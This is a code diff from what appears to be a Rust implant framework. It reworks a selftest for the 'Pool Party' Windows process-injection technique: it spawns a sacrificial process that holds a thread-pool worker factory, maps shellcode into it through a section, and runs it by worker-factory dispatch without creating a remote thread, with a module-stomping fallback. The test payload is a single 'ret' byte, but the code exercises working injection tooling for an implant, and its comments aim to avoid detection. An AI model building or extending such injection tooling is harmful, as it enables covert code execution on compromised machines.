@@ -576,21 +576,21 @@ pub unsafe extern "system" fn nyx_selftest_inject() {
 
 // ============================================================================
 // nyx_selftest_inject_pool: exercise the P5 Pool Party path (Task section-backed
-// delivery). Forces POOL_PARTY_ENABLED on, creates a RUNNING sacrificial —
-// the plain-x64 test sleeper (CRT3_SLEEPER) when deployed (stays alive and
-// holds a thread-pool worker factory), else a running notepad
-// (2026-08-24: a CREATE_SUSPENDED process has no worker factory, so bit1 was
-// unreachable on ANY host; dllhost.exe exits immediately with no COM task —
-// VM-verified; 24H2 notepad.exe is an AppX activation stub, commit e364597) —
-// waits for kernel32 to map (process-init progress proxy, the inject_fls
-// precedent), then calls do_inject(method=0) so the section
-// create→map→write→TP_DIRECT path runs against a real process.
+// delivery). Forces POOL_PARTY_ENABLED on, then injects into a RUNNING
+// sacrificial that already holds a TpWorkerFactory:
+//   1. Preferred: spawn THIS probe with `--hold-tp` (CreateThreadpoolWork +
+//      infinite callback in a *different* PID). Hosted f0237fe proved
+//      CreateThreadpool works inside the probe, then do_inject hit
+//      `refuse self-inject` — so the target MUST NOT be our own pid.
+//   2. Else CRT3_SLEEPER when deployed (rundll32 / real-machine path; the
+//      probe name is not in GetModuleFileNameW).
+//   3. Else bit3 env-skip (notepad has no worker factory; Teach2Breach).
 // bit0 = running sacrificial spawned (section delivery path reached),
 // bit1 = pool_party_inject returned Ok (section delivery + threadless
 //        worker-factory dispatch — NO remote thread is created),
 // bit2 = degraded with WARN prefix to module_stomp (section delivery ran).
-// bit3 = SKIP FLAG (not a pass): env skip — no worker-factory in the probe
-//        process, or OpenProcess failed (GLE=5 ACCESS_DENIED / pid gone).
+// bit3 = SKIP FLAG (not a pass): env skip — no worker-factory in the target,
+//        or OpenProcess failed (GLE=5 ACCESS_DENIED / pid gone).
 //        Distinct from 0x5 WARN-fail. Expected: 0x7 pass / 0x9 skip
 //        (bit0+bit3) / 0x5 WARN-fail. Never treat 0x9 as success.
 // The raw Err string (pool_party's own error, or the WARN-prefixed fallback
@@ -615,33 +615,58 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     // Force the gate ON for this selftest (restore on exit).
     let prev_gate = crate::tp::set_pool_party_enabled(true);
 
-    // Hosted Session 0 never reliably ran CreateThreadpool inside a spawned
-    // sleeper (exit 0x9 with the exe on disk). Arm a worker factory in THIS
-    // process (the console probe) and inject into our own PID — same
-    // requirement Teach2Breach documents (target must already have a TP).
-    if !arm_local_worker_factory() {
-        crate::selftests::write_marker("nyx_g6_inject_pool.target", "arm-tp-fail");
+    let proc = match spawn_probe_hold_tp() {
+        Some(p) => {
+            crate::selftests::write_marker("nyx_g6_inject_pool.target", "probe-hold-tp");
+            p
+        }
+        None => {
+            if sleeper_on_disk() {
+                match unsafe { crate::inject::create_sacrificial_running(CRT3_SLEEPER) } {
+                    Ok(p) => {
+                        crate::selftests::write_marker("nyx_g6_inject_pool.target", CRT3_SLEEPER);
+                        p
+                    }
+                    Err(_) => {
+                        crate::selftests::write_marker(
+                            "nyx_g6_inject_pool.target",
+                            "sleeper-spawn-fail",
+                        );
+                        crate::tp::set_pool_party_enabled(prev_gate);
+                        unsafe { exit(mask) };
+                    }
+                }
+            } else {
+                crate::selftests::write_marker("nyx_g6_inject_pool.target", "no-hold-tp-target");
+                crate::tp::set_pool_party_enabled(prev_gate);
+                mask |= 1 << 3;
+                unsafe { exit(mask) };
+            }
+        }
+    };
+    let self_pid = current_process_id();
+    if proc.pid == 0 || proc.pid == self_pid {
+        crate::selftests::write_marker(
+            "nyx_g6_inject_pool.resp",
+            "refuse self-inject (hold-tp child pid missing or equal)",
+        );
         crate::tp::set_pool_party_enabled(prev_gate);
+        core::mem::drop(proc);
         unsafe { exit(mask) };
     }
-    let pid = current_process_id();
-    if pid == 0 {
-        crate::selftests::write_marker("nyx_g6_inject_pool.target", "pid-0");
-        crate::tp::set_pool_party_enabled(prev_gate);
-        unsafe { exit(mask) };
-    }
-    crate::selftests::write_marker("nyx_g6_inject_pool.target", "self-tp");
     mask |= 1 << 0;
 
-    if let Some(slp) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"Sleep") {
-        let sleep: unsafe extern "system" fn(u32) = unsafe { core::mem::transmute(slp) };
-        unsafe { sleep(500) };
+    let _ = unsafe { crate::inject::wait_remote_kernel32(proc.handle) };
+    if let Some(sleep) = k32_fn::<unsafe extern "system" fn(u32)>(b"Sleep") {
+        // Child CRT + CreateThreadpoolWork must finish before the handle-table
+        // walk; 800ms is the inject_fls wait_remote_kernel32 budget class.
+        unsafe { sleep(800) };
     }
 
     // Minimal shellcode: `ret` (0xC3). x64 callbacks are caller-cleanup, so
     // a lone ret is a valid empty PTP_WORK_CALLBACK.
     let shellcode: [u8; 1] = [0xC3];
-    let resp = crate::inject::do_inject(0, pid, CRT3_SLEEPER, &shellcode);
+    let resp = crate::inject::do_inject(0, proc.pid, CRT3_SLEEPER, &shellcode);
 
     // Decode the response. Response::Output carries a status line we can sniff.
     match resp {
@@ -671,6 +696,8 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     }
 
     crate::tp::set_pool_party_enabled(prev_gate);
+    // Drop terminates the hold-tp child (never mark_resumed).
+    core::mem::drop(proc);
     unsafe { exit(mask) };
 }
 
@@ -1528,59 +1555,64 @@ fn current_process_id() -> u32 {
     }
 }
 
+/// Case-insensitive ASCII needle in a UTF-16 haystack (probe path check).
 #[cfg(feature = "selftest")]
-unsafe extern "system" fn pool_selftest_hold_cb(
-    _: *mut core::ffi::c_void,
-    _: *mut core::ffi::c_void,
-    _: *mut core::ffi::c_void,
-) {
-    type SleepFn = unsafe extern "system" fn(u32);
-    if let Some(sleep) = k32_fn::<SleepFn>(b"Sleep") {
-        unsafe { sleep(0xFFFF_FFFF) };
+fn wide_contains_ascii_ci(hay: &[u16], needle: &[u8]) -> bool {
+    if needle.is_empty() || hay.len() < needle.len() {
+        return false;
     }
+    let fold = |c: u16| -> u16 {
+        if (b'A' as u16..=b'Z' as u16).contains(&c) {
+            c + 32
+        } else {
+            c
+        }
+    };
+    let nlen = needle.len();
+    'outer: for i in 0..=hay.len() - nlen {
+        for j in 0..nlen {
+            if fold(hay[i + j]) != fold(needle[j] as u16) {
+                continue 'outer;
+            }
+        }
+        return true;
+    }
+    false
 }
 
-/// Create a live TpWorkerFactory in the current process (the console probe).
+/// Spawn `nyx-bof-isolated-probe.exe --hold-tp` when this process IS that
+/// probe. Returns None under rundll32 (image name has no probe stem) so the
+/// caller can fall back to CRT3_SLEEPER. The child pid is never our pid.
 #[cfg(feature = "selftest")]
-fn arm_local_worker_factory() -> bool {
+fn spawn_probe_hold_tp() -> Option<crate::inject::SacrificialProcess> {
     use core::ffi::c_void;
-    type CreateThreadpool = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
-    type SetMin = unsafe extern "system" fn(*mut c_void, u32) -> i32;
-    type CreateWork = unsafe extern "system" fn(
-        unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void),
-        *mut c_void,
-        *mut c_void,
-    ) -> *mut c_void;
-    type Submit = unsafe extern "system" fn(*mut c_void);
-    let Some(create_pool) = k32_fn::<CreateThreadpool>(b"CreateThreadpool") else {
-        return false;
-    };
-    let Some(set_min) = k32_fn::<SetMin>(b"SetThreadpoolThreadMinimum") else {
-        return false;
-    };
-    let Some(create_work) = k32_fn::<CreateWork>(b"CreateThreadpoolWork") else {
-        return false;
-    };
-    let Some(submit) = k32_fn::<Submit>(b"SubmitThreadpoolWork") else {
-        return false;
-    };
-    let pool = unsafe { create_pool(core::ptr::null_mut()) };
-    if pool.is_null() {
-        return false;
+    type GetModuleFileNameW = unsafe extern "system" fn(*mut c_void, *mut u16, u32) -> u32;
+    let gmfn = k32_fn::<GetModuleFileNameW>(b"GetModuleFileNameW")?;
+    let mut path = [0u16; 520];
+    let n = unsafe { gmfn(core::ptr::null_mut(), path.as_mut_ptr(), 520) };
+    if n == 0 || (n as usize) >= path.len() {
+        return None;
     }
-    let _ = unsafe { set_min(pool, 1) };
-    let work = unsafe {
-        create_work(
-            pool_selftest_hold_cb,
-            core::ptr::null_mut(),
-            core::ptr::null_mut(),
-        )
-    };
-    if work.is_null() {
-        return false;
+    if !wide_contains_ascii_ci(&path[..n as usize], b"bof-isolated-probe") {
+        return None;
     }
-    unsafe { submit(work) };
-    true
+    // lpCommandLine: `"<path>" --hold-tp` + NUL. Quoted so spaces in the
+    // GitHub runner path cannot split the image name.
+    let mut cmd = Vec::new();
+    cmd.push(b'"' as u16);
+    for i in 0..n as usize {
+        cmd.push(path[i]);
+    }
+    cmd.push(b'"' as u16);
+    for &b in b" --hold-tp" {
+        cmd.push(b as u16);
+    }
+    cmd.push(0);
+    let spawned = unsafe { crate::inject::create_sacrificial_running_wide(&path, &mut cmd) };
+    match spawned {
+        Ok(p) if p.pid != 0 && p.pid != current_process_id() => Some(p),
+        _ => None,
+    }
 }
 
 #[cfg(feature = "selftest")]
